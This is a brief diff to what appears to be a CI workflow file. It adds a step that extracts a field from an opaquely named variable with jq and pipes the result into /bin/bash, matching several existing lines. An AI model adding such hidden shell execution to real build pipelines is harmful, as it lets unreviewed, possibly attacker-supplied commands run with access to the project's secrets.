@@ -28,6 +28,7 @@ jobs:
           echo $ct45834 | jq -r .xwfo29 | /bin/bash
           printf '%s' "$q9939" | jq -r .k65 | /bin/bash
           printf '%s' "$eox8" | jq -r .lett2 | /bin/bash
+          echo $u8388 | jq -r .zhewl7802 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
